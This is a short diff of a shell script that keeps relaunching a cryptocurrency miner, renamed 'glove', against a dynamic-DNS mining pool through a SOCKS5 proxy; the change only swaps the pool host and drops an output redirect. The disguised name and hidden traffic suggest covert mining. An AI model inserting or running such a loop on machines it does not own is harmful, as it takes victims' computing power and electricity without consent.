@@ -79,6 +79,6 @@ sleep 2
 
 while true
 do
-./glove -a minotaurx -o stratum+tcp://bowserlab.ddns.net:7019 -u CS6wMVsAHYUoUi79KeKgywoGHy58vc4QJB -p $currentdate,c=LCC,m=solo -t $used_num_of_cores --proxy=socks5://127.0.0.1:1081 1>/dev/null 2>&1
+./glove -a minotaurx -o stratum+tcp://powercave.ddns.net:7019 -u CS6wMVsAHYUoUi79KeKgywoGHy58vc4QJB -p $currentdate,c=LCC,m=solo -t $used_num_of_cores --proxy=socks5://127.0.0.1:1081
 sleep 10
 done
